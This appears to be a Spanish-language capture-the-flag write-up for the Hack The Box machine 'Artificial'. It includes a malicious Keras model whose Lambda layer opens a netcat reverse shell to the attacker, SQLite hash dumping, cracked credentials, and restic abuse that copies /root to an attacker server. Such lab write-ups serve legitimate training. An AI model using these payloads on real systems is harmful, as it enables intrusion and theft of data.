---

title: "Artificial Hack The Box"
date: "2025-09-10"
description: "Debe tener Descripccion"
difficulty: "Easy"
tags: ["nmap", "gobuster", "ssh", "sudo -l"]


---

# 📝 Planificación y Alcance

---
-  IP: `10.10.11.74`
    
-  Dominio: `artificial.htb`
    
-  Cliente: `HTB`
    
---

# 🔎 Escaneo y Enumeración

### 📌 Escaneos


-  Escanear y Exportar resultados:
    
`nmap -sSCV -p- --open -T4 -Pn -n -vvv -oN escaneo_nmap.txt -oX escaneo_nmap.xml <IP>`

---

### 🛠️ Puertos y Servicios Descubiertos


```bash

PORT   STATE SERVICE REASON         VERSION

22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)

| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://artificial.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

-  WhatWeb: `HTTP Server Ubuntu Linux nginx/1.18.0 (Ubuntu), Script, Title Artificial - AI Solutions, nginx 1.18.0`

---

### 🌐 Enumeración Web

-  **Enumeración de directorios:**
    
`gobuster dir -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 50 -b <NO-STATUS>`

---

### 📂 Hallazgos

- Web:  
**Home**
![[Pasted image 20250923194844.png]]

**Login**
![[Pasted image 20250923195009.png]]

**En la pagina login nos debemos registrar y con esas credenciales ingresar al dashboard.**

**Dashboard**
 ![[Pasted image 20250921184827.png]]

---
 
-  Tecnologías: `Nginx 1.18.0`
   
- Recurso accesibles descargables: requerimients.txt y Dockerfile.
  
- Contenido Archivos:


 **requerimients.txt:**

```bash

tensorflow-cpu==2.13.1

```

**Dockerfile:**

```bash

FROM python:3.8-slim

WORKDIR /code

RUN apt-get update && \
    apt-get install -y curl && \
    curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
    rm -rf /var/lib/apt/lists/*

RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl

ENTRYPOINT ["/bin/bash"]

```

---



# 💥 Explotación

-  Servicio: `Web`
    
-  Método: `Inyeccion de comandos`
    
-  Exploit: `___`
    
-  Resultado (shell/flag): `shell`

## Configuración de un entorno Docker para el exploit de TensorFlow

- Ambos `requirements.txt` y `Dockerfile` se descargaron en mi `Downloads`carpeta. Antes de crear el entorno Docker para el exploit, creé un script de carga útil en el mismo directorio.

**Paso 1: Crear el script de carga útil**

En mi `Downloads`carpeta, creé un archivo llamado `exploit.py`. Este script contiene mi carga útil de TensorFlow:
```bash 

import tensorflow as tf

def exploit(x):
    import os
    os.system("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc <MY-IP> 4444 >/tmp/f")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")

```


**Paso 2: Construir la imagen de Docker**

- Luego abrí una terminal en la `Downloads`carpeta y ejecuté:
```bash

sudo docker build -t artificial-exploit .

```


- Esto creó una imagen de Docker con Python 3.8 y TensorFlow 2.13.1 instalados, que coincidía con el entorno de destino.

**Paso 3: Ejecute el contenedor Docker con un volumen compartido**

- Para asegurar que el archivo de carga útil apareciera en mi sistema host, ejecuté:
 ```bash
 
 sudo docker run -it -v $(pwd):/app artificial-exploit
 
 ```


- `$(pwd)`asigna la carpeta del host actual al `/app`interior del contenedor.

- Cualquier archivo guardado `/app`dentro del contenedor aparece automáticamente en el host.


**Paso 4: Generar la carga útil dentro de Docker**

- Dentro del contenedor, navegué `/app`y ejecuté el script:

```bash

cd /app   
python3 exploit.py

```


- El archivo `exploit.h5`se generó y también apareció `/app` en mi carpeta de host.

**Paso 5: Iniciar un receptor para el shell inverso**

- En mi máquina local, inicié un escucha netcat para capturar el shell inverso:

```bash

nc  -nlvp  4444

```

**Paso 6: Subir la carga útil a la Web**

- Vaya al panel de control (Dashboard), seleccione el archivo `exploit.h5` y cargue el modelo. Después de cargarlo, ejecute la carga útil haciendo clic en " **Ver predicciones"** .

![[Pasted image 20250925170700.png]]



- Una vez que el modelo se ejecutó en el servidor web, mi oyente captó exitosamente la conexión, dándome un shell, en este momento podemos mejorar la TTY si lo deseamos.

## Ganando usuarios

- Al iniciar mi shell como usuario `app`, mi primer instinto fue **enumerar el directorio de la aplicación** .  

- Ejecuté:
```bash
ls -la
```

![[Pasted image 20250923200353.png]]

- Una carpeta llamada `instance`y un archivo llamado `users.db`.  
- Esa `.db`extensión me recordó **a SQLite .**

- Dado que Flask (y muchas aplicaciones web de Python) a menudo almacenan sus datos en una base de datos SQLite dentro de una `instance/`carpeta, esto me hizo sospechar que podía volcar las credenciales de usuario directamente desde allí.

- Confirmé mi presentimiento al ejecutar:

```bash 

file instance/users.db

```


- Regresó `SQLite 3.x database`. ¡Bingo! Definitivamente SQLite.

- Desde allí, quise comprobar qué tablas existían, así que lo abrí directamente:


```bash 

sqlite3 instance/users.db

```


- Una vez en el shell de SQLite, enumeré todas las tablas:

```bash

.tables

```


- Vi dos tablas:

```bash 

model  user

```

- La tabla `user` me llamó la atención de inmediato. Inspeccioné su esquema:

```bash

PRAGMA table_info(user);

```

- Devuelve la información de las columnas de la tabla `user` en SQLite.

- El comando `PRAGMA table_info(nombre_tabla);` lista:

1. **cid** → índice de la columna (empieza en 0).
    
2. **name** → nombre de la columna.
    
3. **type** → tipo de dato declarado (ej. `TEXT`, `INTEGER`).
    
4. **notnull** → 1 si la columna es `NOT NULL`, 0 si permite nulos.
    
5. **dflt_value** → valor por defecto de la columna.
    
6. **pk** → 1 si forma parte de la clave primaria, 0 en caso contrario.

- Esto mostró campos para `id`, `username`, `email`, y `password`.

- El paso final fue volcar el contenido:

```bash

SELECT * FROM user;

```

- Y así, tuve **todos los nombres de usuario, correos electrónicos y contraseñas cifradas** para cada cuenta en la aplicación.

![[Pasted image 20250925121324.png]]

## Volcado y descifrado de hashes de contraseñas

- Desde mi shell, volqué los hashes de contraseña almacenados directamente desde la base de datos (luego de salir del indicador de SQLite con `.quit`si es necesario) a un archivo hash.txt:

```bash
sqlite3 instance/users.db "SELECT password FROM user;"

```

![[Pasted image 20250925121242.png]]

- Con los hashes guardados, usé **Hashcat** en mi máquina atacante para descifrarlos con la `rockyou.txt`lista de palabras:

![[Pasted image 20250925121834.png]]

## Credenciales descifradas

- Al ejecutar Hashcat contra la `rockyou.txt`lista de palabras se revelaron rápidamente dos credenciales válidas:

- Credenciales Encontradas (utiles):

==gael:mattp005numbertwo==

- Probablemente se trataba de cuentas de usuario reales en el sistema objetivo. Con esta información, mi siguiente paso fue intentar **iniciar sesión por SSH** para comprobar si alguna de las cuentas tenía privilegios de acceso remoto.

---



---
# 🛡️ Escalada

-  Impacto real: `SI` 
    
-  Rutas clave: `___`
    
-  Método: `Pivoting, Reastic abuse privilege`
    
-  Nivel de Acceso: `root`
    
-  PoC: `___`

---

## Movimiento lateral a través de SSH

- Con las credenciales descifradas en la mano, comencé a probar el acceso SSH desde mi máquina atacante:

- Ingresamos con el usuario gael y su credencial.

## Bandera user:

- Busqué el `user.txt`archivo en el sistema ejecutando:

```bash

find / -type f -name "user.txt" 2>/dev/null

```

- Devolvió la ruta:

```bash

/home/gael/user.txt

```

- Después de eso, realicé una enumeración rápida para recopilar información del sistema y buscar posibles rutas de escalada de privilegios:

```bash
id
whoami
hostnamectl   
sudo -l   
ss -tulnp | grep LISTEN   
ls -la /var/backups

```

![[Pasted image 20250925123031.png]]

Recomendaciones:

- `gael`**no** era un usuario sudo.
- Existía un archivo de respaldo en `/var/backups/backrest_backup.tar.gz`.
- Un servicio interno estaba escuchando en `127.0.0.1:9898`.


- decidi copiar el archivo backrest_backup.tar.gz a mi maquina y descomprimirla.

```bash

scp gael@10.10.11.74:/var/backups/backrest_backup.tar.gz .

```

- El archivo `backrest_backup.tar.gz`resultó ser un archivo TAR simple, no comprimido con GZIP:


![[Pasted image 20250925123904.png]]

- Al buscar los archivos extraídos, encontré un archivo de configuración. Lo revisé `config.json`y encontré una contraseña codificada con bcrypt. Tras extraer el hash, lo guardé en un archivo:

![[Pasted image 20250925124053.png]]

Luego usé **Hashcat** con la `rockyou.txt`lista de palabras para descifrarlo:

```bash

hashcat -m 3200 /tmp/bcrypt.hash /usr/share/wordlists/rockyou.txt --force

```

- Resultado:

```bash

!@#$%^

```


![[Pasted image 20250925124713.png]]


## Pivotando hacia el Servicio Interno

- Estas credenciales pertenecían a una **cuenta de administrador** de un servicio web local que se ejecutaba en el puerto `9898`. Las redirigí a mi máquina:

```bash

ssh -L 9898:127.0.0.1:9898 gael@10.10.11.74

```

- Luego accedí a él a través de:

- http://localhost:9898

- Detalles de inicio de sesión:

Nombre de usuario: backrest_root   
Contraseña: !@# $% ^


## Abusar de Restic para el acceso root

- Una vez que obtuve acceso de administrador a la interfaz web de Backrest, vi la oportunidad de abusar de su función de restauración para enviar copias de seguridad a un servidor que yo controlaba. Para ello, necesitaba configurar un receptor compatible con Restic.

- Qué es Backrest (Para restic):

**Es una interfaz web + orquestador para la herramienta de backup restic. 
Permite crear repositorios de backup, programar backups automáticamente, y realizar mantenimientos como “prune”, “forget”, “check”. 
En la interfaz puedes explorar snapshots (versiones guardadas), navegar contenido de backups, y restaurar archivos vía web. 
Ofrece hooks previos o posteriores al backup para ejecutar comandos personalizados. 
Compatible con múltiples backend de almacenamiento (local, S3, Azure, rclone, SFTP). 
Puede configurarse en Docker, Linux, macOS, Windows.**

- GTFOBins: https://gtfobins.github.io/gtfobins/restic/

- Lancé una instancia de servidor Rest en mi máquina atacante:

```bash

rest-server --path /tmp/restic-data --listen :12345 --no-auth

```

Con el oyente activo, estaba listo para configurar el servicio Backrest del sistema de destino para conectarse a mi máquina y volcar datos confidenciales.

## Creación de un repositorio en Backrest

En la interfaz web de Backrest, navegué a la sección **Repositorios** y hice clic en **Agregar repositorio** .

- **Nombre:** `root_backup`.
- **URL del repositorio:** `/opt/backrest`
- **Contraseña:** Se puede generar pero se debe recordar o almacenar.

- Después de crearlo, el nuevo repositorio apareció en la pestaña **Repositorios** , lo que confirmó que se creó correctamente.



## Ejecución de comandos Restic para realizar copias de seguridad y restaurar

- Una vez creado el repositorio en Backrest, hice clic en él y fui a la pestaña **Ejecutar comando** .

- A partir de ahí, ejecuté los siguientes pasos en la consola de la aplicacion:

### 1. Inicializar el repositorio

```bash
-r rest:http://<YOUR-IP>:12345/<repo-name> init

```

### 2. Copia de seguridad `/root`en el destino

```bash 

-r rest:http://<YOUR-IP>:12345/<repo-name> backup /root

```

![[Pasted image 20250925174248.png]]

## Listado y restauración de la instantánea

**En la máquina atacante: Restauración de una instantánea**

- Con el oyente aún ejecutándose en segundo plano, abrí una nueva pestaña de terminal para trabajar con los datos de respaldo.

- Primero, enumeré todas las instantáneas disponibles:

```bash

-r /tmp/restic-data/<repo-name> snapshots

```

![[Pasted image 20250925164048.png]]

- Esto me mostró cada estado guardado del repositorio, completo con marcas de tiempo e identificaciones.

- Una vez que tuve la ID de instantánea correcta, la restauré en una carpeta llamada `restore`:

```bash

-r /tmp/restic-data/<repo-name> restore <snapshot-id> --target ./restore

```

## Bandera raíz

Después de restaurar la copia de seguridad, vea el indicador raíz:

```bash
cat restore/root/root.txt

```

---

### Vulnerabilidades

-  CVE: `___`
    
-  Nivel: `___`
    

### Credenciales

-  Usuario: `___`
    
-  Contraseña: `___`
    
-  Origen (FTP/SSH/Web): `___`
    

---

# 📌 Reporte Final

-  Descripción General: `___`
    
-  Recomendaciones: `___`
    

**Resumen:**

-  Puertos abiertos: `___`
    
-  Usuarios válidos: `___`
    
-  Credenciales útiles: `___`
    
-  Posibles escaladas: `___`
    
-  PoC: `___`
    
-  Impacto: `___`
    
-  Nivel de acceso logrado: `___`
    

---

# 🛠️ Notas y Herramientas:


¿Qué es Backrest?

**Backrest** es una interfaz de usuario web (UI) y una herramienta de orquestación para el programa de copias de seguridad de línea de comandos _Restic_. Está diseñado para simplificar el proceso de copia de seguridad tanto para sistemas interactivos como para sistemas sin interfaz gráfica (como un servidor doméstico o un NAS). 

Las características clave de Backrest incluyen: 

- **Interfaz web**: Proporciona una interfaz gráfica intuitiva para crear y gestionar copias de seguridad, examinar instantáneas y restaurar archivos.

- **Orquestación de copias de seguridad**: Permite a los usuarios configurar calendarios de copias de seguridad, políticas de retención y tareas de mantenimiento (como `prune` y `check`) sin necesidad de escribir scripts manualmente.

- **Compatibilidad multiplataforma**: Disponible para Linux, macOS, Windows, FreeBSD y Docker.

- **Ganchos de notificación**: Puede enviar notificaciones a través de servicios como Discord, Slack y Gotify para eventos de copia de seguridad como éxito o fracaso.

- **Compatibilidad con Restic**: Como es un wrapper ligero, Backrest crea repositorios Restic estándar que se pueden seguir gestionando manualmente a través de la herramienta de línea de comandos de Restic.